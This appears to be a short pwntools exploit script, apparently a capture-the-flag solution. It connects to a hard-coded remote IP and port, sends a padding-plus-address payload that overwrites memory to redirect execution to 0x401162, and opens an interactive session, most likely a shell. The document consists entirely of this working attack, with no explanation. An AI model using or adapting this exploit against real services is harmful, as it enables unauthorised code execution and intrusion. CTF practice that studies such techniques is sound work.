from pwn import *

proc = remote("109.233.56.90", 11606)
input()
proc.send(b"A"*8 + p64(0x405078))
proc.send(p64(0x00401162))
proc.interactive()
